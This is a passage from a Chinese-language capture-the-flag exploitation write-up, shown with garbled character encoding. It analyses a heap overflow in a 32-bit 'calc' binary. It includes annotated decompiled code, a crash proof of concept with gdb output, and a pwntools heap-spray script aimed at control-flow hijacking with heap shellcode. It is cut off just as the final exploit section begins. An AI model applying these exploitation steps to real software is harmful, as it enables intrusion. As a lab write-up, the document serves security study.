strlen(s);\n/*è¿›å…¥forå¾ªç¯å¤„ç†å­—ç¬¦ä¸²s*/\n  for ( i = 0; i <= v6; ++i )\n  {\n/*1ã€åˆ¤æ–­dword_804D0B0å †å—æŒ‡å‘çš„å †å—åç§»4å­—èŠ‚çš„ä½ç½®æ˜¯å¦ä¸ä¸ºç©ºï¼›2ã€åˆ¤æ–­dword_804D0B0å †å—æŒ‡å‘çš„å †å—åœ°å€åç§»8å­—èŠ‚å¤„æ˜¯å¦è·Ÿå­—ç¬¦ä¸²çš„ç¬¬iä¸ªå­—ç¬¦ä¸ç›¸ç­‰ã€‚ä¸¤ä¸ªåŒæ—¶æ»¡è¶³æ—¶æ‰§è¡Œv5 = *(v5 + 4)ï¼›å…¶ä¸­ä¸€ä¸ªä¸æ»¡è¶³åˆ™è·³è¿‡è¯¥æ“ä½œï¼Œç»§ç»­æ‰§è¡Œåç»­éƒ¨åˆ†ã€‚*/\n    while ( *(v5 + 4) && *(v5 + 8) != s[i] )\n      v5 = *(v5 + 4);\n/*å¦‚æœæ­¤æ—¶v5å †å—åç§»8å­—èŠ‚çš„ä½ç½®è·Ÿs[i]çš„å€¼ä¸ç›¸ç­‰ï¼Œåˆ™è¿›å…¥ifè¯­å¥ä¸­å¤„ç†ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œåˆ™å¤ç”¨è¯¥å †å—ï¼Œç»§ç»­å¤„ç†ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚*/\n    if ( *(v5 + 8) != s[i] )\n    {\n/*æ–°ç”³è¯·ä¸€ä¸ª0x10å¤§å°çš„å †å—ï¼Œå¹¶å°†å †å—åœ°å€å†™åˆ°v5å †å—åç§»4å­—èŠ‚çš„ä½ç½®ã€‚ç„¶åå°†s[i]å†™åˆ°æ–°ç”³è¯·çš„å †å—åç§»8å­—èŠ‚çš„ä½ç½®ã€‚ç„¶åè®©v5æŒ‡å‘æ–°ç”³è¯·çš„å †å—ã€‚*/\n      *(v5 + 4) = calloc(0x10u, 1u);\n      *(*(v5 + 4) + 8) = s[i];\n      v5 = *(v5 + 4);\n/**/\n      while ( strlen(s) > i )\n      {\n        *v5 = calloc(0x10u, 1u);\n        *(*v5 + 8) = s[++i];\n        v5 = *v5;\n      }\n      break;\n    }\n/*å¦‚æœs[i]ä¸ºç©ºï¼Œå³åˆ°äº†å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ï¼Œåˆ™ç»“æŸå¾ªç¯ã€‚*/\n    if ( !s[i] )\n      break;\n/*å¦‚æœ*v5ä¸ºç©ºï¼Œæ–°ç”³è¯·ä¸€ä¸ª0x10å¤§å°çš„å †å—ï¼Œå¹¶è®©*v5æŒ‡å‘è¯¥å¯¹å †å—ã€‚ç„¶åå°†s[i+1]å¤„çš„å­—ç¬¦å†™åˆ°æ–°ç”³è¯·å †å—åç§»8å­—èŠ‚çš„ä½ç½®ã€‚*/\n    if ( !*v5 )\n    {\n      *v5 = calloc(0x10u, 1u);\n      *(*v5 + 8) = s[i + 1];\n    }\n/*è®©v5æŒ‡å‘*v5æŒ‡å‘çš„å †å—*/\n    v5 = *v5;\n  }\n/*ä¸Šè¿°å¾ªç¯å°†æ‰€æœ‰çš„å­—ç¬¦å…¨éƒ¨å¤„ç†å®Œæ¯•åï¼Œå°†v5å½“å‰æŒ‡å‘å †å—çš„åœ°å€ç»™result*/\n  result = v5;\n/*å°†a3ï¼ˆå³sub_804A83F()è¿”å›çš„å †å—ï¼‰çš„åœ°å€å†™åˆ°v5å †å—å†…åç§»12å­—èŠ‚çš„ä½ç½®*/\n  *(v5 + 12) = a3;\n  return result;\n}\n```\n\næ‰§è¡Œå®Œ4 5 6 7è¡Œåï¼Œä¼šå½¢æˆå¦‚ä¸‹å›¾æ‰€ç¤ºçš„å †ç©ºé—´å…³ç³»ï¼š\n\n![](image-20200626232425175.png)\n\n### line 8 \n\nè¿™ä¸ªwhileå¾ªç¯å†…ä¼šå¯¹è¾“å…¥è¿›è¡Œå¤„ç†ï¼Œæ˜¯è·Ÿå¤–éƒ¨æ•°æ®äº¤äº’çš„çª—å£ï¼Œå› æ­¤æ¼æ´ææœ‰å¯èƒ½å­˜åœ¨äºå¾ªç¯å†…éƒ¨çš„å¤„ç†è¿‡ç¨‹ã€‚\n\n### line 9\n\nè¿™ä¸€è¡Œé€šè¿‡fgetsä»æ ‡å‡†è¾“å…¥ï¼ˆå³é”®ç›˜ï¼‰ä¸­è·å–è¾“å…¥å­—ç¬¦ä¸²ã€‚æ ¹æ®fgetsçš„ç‰¹æ€§ï¼Œæœ¬é¢˜ä¸­å®ƒæœ€å¤šæ¥å—`256-1=255`ä¸ªå­—ç¬¦è¾“å…¥ã€‚såœ¨æ ˆä¸Šçš„ç©ºé—´ä¸º0x100=256ï¼ŒåŠ ä¸Šå­—ç¬¦ä¸²ç»“æŸç¬¦'\\x00'ä¹Ÿä¸ä¼šæº¢å‡ºã€‚\n\n> **char \\*fgets(char \\*str, int n, FILE \\*stream)** ä»æŒ‡å®šçš„æµ stream è¯»å–ä¸€è¡Œï¼Œå¹¶æŠŠå®ƒå­˜å‚¨åœ¨ **str** æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²å†…ã€‚å½“è¯»å– **(n-1)** ä¸ªå­—ç¬¦æ—¶ï¼Œæˆ–è€…è¯»å–åˆ°æ¢è¡Œç¬¦æ—¶ï¼Œæˆ–è€…åˆ°è¾¾æ–‡ä»¶æœ«å°¾æ—¶ï¼Œå®ƒä¼šåœæ­¢ã€‚\n\n### line 10\n\nè¿™ä¸€è¡ŒåŠåä¸¤è¡Œçš„ç›®çš„æ˜¯å¯¹è¾“å…¥å­—ç¬¦ä¸²è¿›è¡Œå¤„ç†ã€‚å¯»æ‰¾è¾“å…¥å­—ç¬¦ä¸²æœ€åä¸€æ¬¡å‡ºç°'\\n'çš„ä½ç½®ï¼Œå³å­—ç¬¦ä¸²ç»“æŸçš„ä½ç½®ï¼Œå¹¶å¾€è¯¥ä½ç½®å†™0x00ï¼ˆæ˜¯ASCIIç çš„0ï¼Œè€Œä¸æ˜¯å­—ç¬¦ '0'ã€‚ï¼‰\n\n### line11\n\nç¬¬11è¡Œæ˜¯å‡½æ•°sub_8048BC1(&s)ï¼Œå¤„ç†è¾“å…¥çš„å­—ç¬¦ä¸²sã€‚ä½¿ç”¨strtokå°†å­—ç¬¦ä¸²sè¿›è¡Œåˆ†è§£ã€‚\n\n> char *strtok(char *str, const char *delim) åˆ†è§£å­—ç¬¦ä¸² str ä¸ºä¸€ç»„å­—ç¬¦ä¸²ï¼Œdelim ä¸ºåˆ†éš”ç¬¦ã€‚\n\nè¿™ä¸ªå‡½æ•°ä¸­ï¼Œæœ‰ä¸‰ä¸ªå¤§çš„å¤„ç†é€»è¾‘ï¼š\n\n- while ( s1 )ï¼šå¯¹ä¼ å…¥å­—ç¬¦ä¸²åˆ†è§£å¾—åˆ°çš„è¿ç®—æ•°å’Œè¿ç®—ç¬¦è¿›è¡Œè§£æï¼Œå¹¶å°†è¿ç®—æ•°é“¾æ¥åˆ°bssæ®µçš„dword_804D0B4ï¼Œå°†è¿ç®—ç¬¦é“¾æ¥åˆ°bssæ®µçš„dword_804D0ACã€‚\n- while ( !sub_804A8D7(dword_804D0AC) )ï¼šåˆ¤æ–­dword_804D0ACæŒ‡å‘å †ç©ºé—´çš„ç¬¬ä¸€ä¸ªå€¼æ˜¯å¦ä¸º0ï¼ˆç¬¬ä¸€ä¸ªå€¼ä»£è¡¨è¿ç®—ç¬¦ä¸ªæ•°ï¼‰ï¼Œå³åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¿ç®—ç¬¦ã€‚\n- if ( !result )\n\n#### while(s1)\n\nå¦‚ä¸‹å¯¹è¿ç®—æ•°çš„å¤„ç†ä¸­å­˜åœ¨æ¼æ´å‡½æ•°ã€‚é‡ç‚¹çœ‹aå’Œbä¸¤æ®µæŒ‡ä»¤ã€‚\n\n```c\n    if ( (*__ctype_b_loc())[*s1] & 0x800 || *s1 == '-' && strlen(s1) > 1 )\n    {\n      if ( sub_804886B(s1) )\n      {\n        v1 = sub_804A6F8(byte_804AC65, s1);\t\t//a\n        sub_804A8B5(dword_804D0B4, v1);\t\t\t//b\n      }\n      else\n      {\n        puts(\"invalid number\");\n      }\n      goto LABEL_68;\n    }\n```\n\n- a - sub_804A6F8å‡½æ•°\n\n  ```c\n  _DWORD *__cdecl sub_804A6F8(char *s, char *nptr)\n  {\n    _DWORD *v2; // ST1C_4\n  \n    v2 = calloc(0x10u, 1u);\n    v2[2] = strtol(nptr, 0, 10);\n    v2[1] = \"int\";\n    *v2 = strdup(s);\n    v2[3] = strlen(nptr);\n    return v2;\n  }\n  ```\n\n  å¯ä»¥çœ‹åˆ°ï¼Œè¯¥å‡½æ•°ä¸­ç”Ÿæˆäº†å¦‚ä¸‹å †å—ï¼Œå¹¶è¿”å›ç»™ä¸Šå±‚è°ƒç”¨è€…ã€‚\n\n  ```\n  heap1ä¸­å­˜æ”¾ç€å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼›string1å¤„çš„å­—ç¬¦ä¸²ä¸ºâ€œintâ€ï¼›numæ˜¯è¿ç®—æ•°çš„åè¿›åˆ¶è¡¨è¾¾å¼ï¼›æœ€åä¸€ä¸ªå—ä¸­å­˜æ”¾è¿ç®—æ•°çš„é•¿åº¦ä¿¡æ¯ã€‚\n  |------------|\n  | &heap1     |\n  |------------|\n  | &string1   |\n  |------------|\n  | num        |\n  |------------|\n  | strlen(num)|\n  |------------|\n  ```\n\n  \n\n- b - sub_804A8B5å‡½æ•°\n\n  ```c\n  _DWORD *__cdecl sub_804A8B5(_DWORD *a1, int a2)\n  {\t\t\n    _DWORD *result; // eax\n  \n    ++*a1;\n    result = a1;\n    a1[*a1 + 1] = a2;\n    return result;\n  }\n  ```\n\n  è¯¥å‡½æ•°çš„å…¥å‚ä¸ºï¼ša1æ˜¯dword_804D0B4ï¼ˆå³æŒ‡å‘0x84å¤§å°çš„å †å—ï¼‰ï¼Œa2æ˜¯sub_804A6F8å‡½æ•°è¿”å›çš„å †å—åœ°å€ã€‚å‡½æ•°çš„åŠŸèƒ½æ˜¯æ“ä½œ0x84å †å—ä¸­çš„å†…å®¹ï¼Œå°†å †ä¸­ç¬¬ä¸€å—ï¼ˆ4å­—èŠ‚ï¼‰çš„å†…å®¹è‡ªåŠ 1ï¼ˆä½œä¸ºè®¡æ•°ï¼Œè®°å½•å †å—ä¸­é“¾æ¥äº†å¤šå°‘ä¸ªæ“ä½œæ•°ï¼‰ï¼Œå¹¶ä»ç¬¬3ä¸ªå—ï¼ˆa1[2]ï¼‰å¤„é“¾æ¥æ“ä½œæ•°å †å—a2ã€‚\n\nå¯¹è¿ç®—ç¬¦çš„å¤„ç†è¿‡ç¨‹è·Ÿä»¥ä¸Šå¯¹è¿ç®—æ•°çš„å¤„ç†è¿‡ç¨‹åŸºæœ¬ä¸€è‡´ï¼Œåªä¸è¿‡è¿ç®—ç¬¦æ˜¯é“¾æ¥åœ¨dword_804D0ACæŒ‡å‘çš„å †å—ä¸Šã€‚\n\nç”±äºdword_804D0B4æŒ‡å‘çš„å †å—å…ˆäºdword_804D0ACæŒ‡å‘å †å—çš„ç”³è¯·ï¼Œå› æ­¤ä»–ä¿©åœ¨å †ç©ºé—´çš„æ’å¸ƒå¦‚ä¸‹ï¼š\n\n![](image-20200627001525800.png)\n\ndword_804D0B4æŒ‡å‘çš„å †å—å¤§å°ä¸º0x84ï¼Œæœ€å¤šå¯å­˜å‚¨0x84/0x4 - 2=0x21 - 2=33 - 2 = 31ä¸ªè¿ç®—æ•°ä¿¡æ¯ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è¾“å…¥256ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸²ï¼Œå› æ­¤æˆ‘ä»¬å¯è¾“å…¥çš„è¿ç®—æ•°è¿œè¿œå¤§äº31ï¼Œé‚£ä¹ˆæ­¤æ—¶è¿ç®—æ•°ä¿¡æ¯å°±ä¼šæº¢å‡ºåˆ°å­˜æ”¾è¿ç®—ç¬¦çš„å †å—ã€‚å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œç¬¬33ä¸ªè¿ç®—æ•°çš„å †å—ä¼šè¦†ç›–ç»¿è‰²å †å—ä¸­çš„countï¼Œé‚£ä¹ˆä¹‹åè®¿é—®è¿ç®—ç¬¦çš„æ—¶å€™ä¼šå–åˆ°ä¸€ä¸ªè¶…å¤§çš„å€¼ã€‚\n\n#### while ( !sub_804A8D7(dword_804D0AC) )\n\n```c\n    v9 = sub_804A88E(dword_804D0AC);\n    (*(v9 + 8))();\n```\n\nå…ˆè°ƒç”¨sub_804A88Eå‡½æ•°ï¼Œä»è¿ç®—ç¬¦å †å—ä¸­å–å‡ºä¸€ä¸ªè¿ç®—ç¬¦ï¼Œç„¶åå¯¹è¯¥è¿ç®—ç¬¦å–å€¼è¿è¡Œã€‚\n\n```c\nint __cdecl sub_804A88E(_DWORD *a1)\n{\n  return a1[(*a1)-- + 1];\n}\n```\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°sub_804A88Eä¸­è®¿é—®äº†è¿ç®—ç¬¦å †å—çš„ç¬¬ä¸€ä¸ªcountï¼Œå³*a1ã€‚ä¸Šé¢è®¨è®ºäº†è¿™ä¸ªå€¼å¯ä»¥è¢«è¶Šç•Œè¦†ç›–ï¼Œå› æ­¤åœ¨è¿™é‡Œä¼šè¶Šç•Œè®¿é—®ï¼Œå¯¼è‡´ç¨‹åºå´©æºƒã€‚\n\n## 1.4 poc\n\n```shell\n$ python -c \"print '1 ' * 33\"\n1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 \n$ gdb calc\ngefâ¤  r\nStarting program: /mnt/hgfs/VMshare/calc/calc \n> 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 \n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0804a89c in ?? ()\n[ Legend: Modified register | Code | Heap | Stack | String ]\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€\n$eax   : 0x0804e0a8  â†’  0x0804f058  â†’  0x0804f070  â†’  0x00000000\n$ebx   : 0x0       \n$ecx   : 0x0       \n$edx   : 0x0804f058  â†’  0x0804f070  â†’  0x00000000\n$esp   : 0xffffcd08  â†’  0x00000000\n$ebp   : 0xffffcd18  â†’  0xffffcd78  â†’  0xffffcea8  â†’  0x00000000\n$esi   : 0xf7fb6000  â†’  0x001b1db0\n$edi   : 0xf7fb6000  â†’  0x001b1db0\n$eip   : 0x0804a89c  â†’   mov eax, DWORD PTR [eax+edx*4+0x4]\n$eflags: [carry parity adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]\n$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 \nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ stack â”€â”€â”€â”€\n0xffffcd08â”‚+0x0000: 0x00000000\t â† $esp\n0xffffcd0câ”‚+0x0004: 0x00000000\n0xffffcd10â”‚+0x0008: 0x00000000\n0xffffcd14â”‚+0x000c: 0x00000000\n0xffffcd18â”‚+0x0010: 0xffffcd78  â†’  0xffffcea8  â†’  0x00000000\t â† $ebp\n0xffffcd1câ”‚+0x0014: 0x080493b6  â†’   add esp, 0x10\n0xffffcd20â”‚+0x0018: 0x0804e0a8  â†’  0x0804f058  â†’  0x0804f070  â†’  0x00000000\n0xffffcd24â”‚+0x001c: 0x0804ac54  â†’   and BYTE PTR [eax], al\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ code:x86:32 â”€â”€â”€â”€\n    0x804a892                  in     al, dx\n    0x804a893                  adc    BYTE PTR [ebx+0x108b0845], cl\n    0x804a899                  mov    eax, DWORD PTR [ebp+0x8]\n â†’  0x804a89c                  mov    eax, DWORD PTR [eax+edx*4+0x4]\n    0x804a8a0                  mov    DWORD PTR [ebp-0x4], eax\n    0x804a8a3                  mov    eax, DWORD PTR [ebp+0x8]\n    0x804a8a6                  mov    eax, DWORD PTR [eax]\n    0x804a8a8                  lea    edx, [eax-0x1]\n    0x804a8ab                  mov    eax, DWORD PTR [ebp+0x8]\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ threads â”€â”€â”€â”€\n[#0] Id 1, Name: \"calc\", stopped, reason: SIGSEGV\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€\n[#0] 0x804a89c â†’ mov eax, DWORD PTR [eax+edx*4+0x4]\n[#1] 0x80493b6 â†’ add esp, 0x10\n[#2] 0x8048bb9 â†’ add esp, 0x10\n[#3] 0xf7e1c637 â†’ __libc_start_main(main=0x80488cb, argc=0x1, argv=0xffffcf54, init=0x804aba0, fini=0x804ac00, rtld_fini=0xf7fe8880 <_dl_fini>, stack_end=0xffffcf4c)\n[#4] 0x8048791 â†’ hlt \nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\ngefâ¤  vmmap\nStart      End        Offset     Perm Path\n0x08048000 0x0804c000 0x00000000 r-x /mnt/hgfs/VMshare/calc/calc\n0x0804c000 0x0804d000 0x00003000 r-x /mnt/hgfs/VMshare/calc/calc\n0x0804d000 0x0804e000 0x00004000 rwx /mnt/hgfs/VMshare/calc/calc\n0x0804e000 0x0806f000 0x00000000 rwx [heap]\n0xf7e03000 0xf7e04000 0x00000000 rwx \n0xf7e04000 0xf7fb4000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fb4000 0xf7fb6000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fb6000 0xf7fb7000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so\n0xf7fb7000 0xf7fba000 0x00000000 rwx \n0xf7fd3000 0xf7fd4000 0x00000000 rwx \n0xf7fd4000 0xf7fd7000 0x00000000 r-- [vvar]\n0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]\n0xf7fd9000 0xf7ffc000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so\n0xfffdd000 0xffffe000 0x00000000 rwx [stack]\ngefâ¤  \n```\n\nå¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºè¿è¡Œåˆ°`0x804a89c   mov    eax, DWORD PTR [eax+edx*4+0x4]`å¤„æ—¶ï¼Œå´©æºƒäº†ã€‚`eax+edx*4+0x4 = 0x0804e0a8 +0x0804f058*4 + 0x4 = 0x2818a20c`ã€‚é€šè¿‡ä¸Šé¢çš„vmmapä¿¡æ¯ï¼Œå¯ä»¥çœ‹å‡ºï¼Œ0x2818a20cè¿™ä¸ªåœ°å€å¹¶æœªè¢«æ˜ å°„ï¼Œæ‰€ä»¥è®¿é—®æ—¶ä¼šå¯¼è‡´ç¨‹åºå¼‚å¸¸å´©æºƒã€‚\n\næˆ‘ä»¬è¦æ€æ ·åˆ©ç”¨è¿™ä¸ªå¼‚å¸¸è®¿é—®å‘¢ï¼Ÿå¦‚æœæˆ‘ä»¬èƒ½å°†è¿™ä¸ªè¶…å¤§åœ°å€æ˜ å°„æˆåŠŸï¼Œå¹¶ä¸”èƒ½æ§åˆ¶è¿™ä¸ªåœ°å€çš„å†…å®¹ï¼Œæ˜¯ä¸æ˜¯å°±èƒ½æ§åˆ¶æ‰§è¡Œæµäº†å‘¢ï¼Ÿ\n\nè¿™ä¸ªé¢˜æ²¡æœ‰å¼€NXï¼Œå› æ­¤å †æ ˆä¸Šçš„æ•°æ®å¯ä»¥æ‰§è¡Œï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å †ä¸Šå¸ƒå±€shellcodeã€‚\n\n# 2 åˆ©ç”¨\n\n## 2.1 ç”³è¯·ä¸é‡Šæ”¾çš„å †ç©ºé—´\n\næˆ‘ä»¬å‘ç°ä¹˜æ³•å‡½æ•°sub_8049A0Eä¸­æœ‰ä¸€æ®µç”³è¯·å†…å­˜çš„æ“ä½œï¼Œä½†æ˜¯å¹¶æ²¡æœ‰é‡Šæ”¾è¿™äº›å†…å­˜ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥ä¹˜æ³•å‡½æ•°ï¼Œä¸æ–­æ‰©å±•å †ç©ºé—´ï¼Œä½¿0x2818a20cè¿™ä¸ªä½ç½®è¢«æ˜ å°„ã€‚\n\nå¦‚ä¸‹ä»£ç æ®µæ˜¯sub_8049A0Eå‡½æ•°ä¸­æ¶‰åŠå†…å­˜ç”³è¯·çš„éƒ¨åˆ†ã€‚å½“ä¸€ä¸ªå­—ç¬¦ç±»å‹å’Œä¸€ä¸ªæ•´å½¢ç›¸ä¹˜æ—¶ï¼Œä¼šæ ¹æ®å­—ç¬¦é•¿åº¦å’Œæ•´å‹å€¼çš„ä¹˜ç§¯ç”³è¯·å †ç©ºé—´ã€‚`*(v8 + 12)` æ˜¯å­—ç¬¦çš„é•¿åº¦ï¼Œ`*(v7 + 8)`æ˜¯æ•´å‹å€¼ã€‚\n\n```c\n       else if ( !strcmp(*(v8 + 4), \"str\") && !strcmp(*(v7 + 4), \"int\") )\n        {\n          v6 = *(v7 + 8);\n          dest = calloc(*(v8 + 12) * *(v7 + 8) + 1, 1u);\n          v9 = dest;\n```\n\nå› æ­¤ç”¨å¦‚ä¸‹pocæµ‹è¯•ç”³è¯·å †ç©ºé—´ï¼Œç¡®è®¤èƒ½å¦å°†è¾ƒé«˜åœ°å€å¤„æ˜ å°„æˆåŠŸã€‚\n\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch = \"i386\",os = \"linux\")\nmyelf = ELF(\"./calc\")\nmyproc = process(myelf.path)\n\npayload = '\"a \" * 100000'\nfor i in range(6000):\n    myproc.sendlineafter(\">\",payload)\ngdb.attach(myproc,\"b * 0x0804A89C\\nc\")\n\nmyproc.recvuntil(\">\")\npayload = \"1 \" * 33\nmyproc.sendline(payload)\n\nmyproc.interactive()\n```\n\næ‰§è¡Œç»“æœå¦‚ä¸‹ï¼Œå¯è§0x09779000è‡³0x510e2000çš„åœ°å€ç©ºé—´å…¨è¢«æ˜ å°„ä¸ºå †ç©ºé—´äº†ï¼Œå¹¶ä¸”è¢«æˆ‘ä»¬çš„è¾“å…¥\"a \"ç»™å¡«æ»¡äº†ã€‚\n\n```shell\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€\n$eax   : 0x097790a8  â†’  0x510c22d8  â†’  0x510c22f0  â†’  0x00000000\n$ebx   : 0x0       \n$ecx   : 0x0       \n$edx   : 0x510c22d8  â†’  0x510c22f0  â†’  0x00000000\n\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ code:x86:32 â”€â”€â”€â”€\n    0x804a892                  in     al, dx\n    0x804a893                  adc    BYTE PTR [ebx+0x108b0845], cl\n    0x804a899                  mov    eax, DWORD PTR [ebp+0x8]\n â†’  0x804a89c                  mov    eax, DWORD PTR [eax+edx*4+0x4]\n    0x804a8a0                  mov    DWORD PTR [ebp-0x4], eax\n    0x804a8a3                  mov    eax, DWORD PTR [ebp+0x8]\n    0x804a8a6                  mov    eax, DWORD PTR [eax]\n\ngefâ¤  vmmap\nStart      End        Offset     Perm Path\n0x08048000 0x0804c000 0x00000000 r-x /mnt/hgfs/VMshare/calc/calc\n0x0804c000 0x0804d000 0x00003000 r-x /mnt/hgfs/VMshare/calc/calc\n0x0804d000 0x0804e000 0x00004000 rwx /mnt/hgfs/VMshare/calc/calc\n0x09779000 0x510e2000 0x00000000 rwx [heap]\n0xf7dad000 0xf7dae000 0x00000000 rwx \n0xf7dae000 0xf7f5e000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7f5e000 0xf7f60000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7f60000 0xf7f61000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so\n0xf7f61000 0xf7f64000 0x00000000 rwx \n0xf7f7d000 0xf7f7e000 0x00000000 rwx \n0xf7f7e000 0xf7f81000 0x00000000 r-- [vvar]\n0xf7f81000 0xf7f83000 0x00000000 r-x [vdso]\n0xf7f83000 0xf7fa6000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7fa6000 0xf7fa7000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7fa7000 0xf7fa8000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so\n0xfffd0000 0xffff1000 0x00000000 rwx [stack]\n\ngefâ¤  x/10gx 0x33333333\n0x33333333:\t0x6161616161616161\t0x6161616161616161\n0x33333343:\t0x6161616161616161\t0x6161616161616161\n0x33333353:\t0x6161616161616161\t0x6161616161616161\n0x33333363:\t0x6161616161616161\t0x6161616161616161\n0x33333373:\t0x6161616161616161\t0x6161616161616161\n```\n\næ­¤æ—¶eax+edx*4+0x4çš„è®¡ç®—å¦‚ä¸‹ï¼š\n\n```shell\n>>> eax = 0x097790a8\n>>> edx = 0x510c22d8\n>>> hex(eax+edx*4+0x4)\n'0x14da81c0c'\n```\n\nç”±äºç¯å¢ƒæ˜¯32ä½çš„ï¼Œæ‰€ä»¥æœ€ç»ˆè®¡ç®—ç»“æœä¸º'0x4da81c0c'ï¼Œè¿™ä¸ªå€¼æ˜¯sub_804A88Eå‡½æ•°çš„è¿”å›å€¼ã€‚è¿™ä¸ªè¿”å›å€¼ä½œä¸ºåœ°å€ï¼Œåç§»8å­—èŠ‚çš„ä½ç½®å¤„çš„å€¼ï¼Œä¼šè¢«ä½œä¸ºå‡½æ•°æ‰§è¡Œã€‚å¦‚æœæˆ‘ä»¬èƒ½åŠ«æŒ0x4da81c0c+8=0x4da81c14åœ°å€å¤„çš„å€¼ï¼Œå°±å¯ä»¥åŠ«æŒæ§åˆ¶æµã€‚\n\n```c\n    v9 = sub_804A88E((_DWORD *)G_D0AC);\n    (*(void (**)(void))(v9 + 8))();\n```\n\n## 2.2 exp\n\né€šè¿‡ä»¥ä¸Šçš„åˆ†æå¯çŸ¥ï¼Œæˆ‘ä»¬éœ€è¦å¾€å 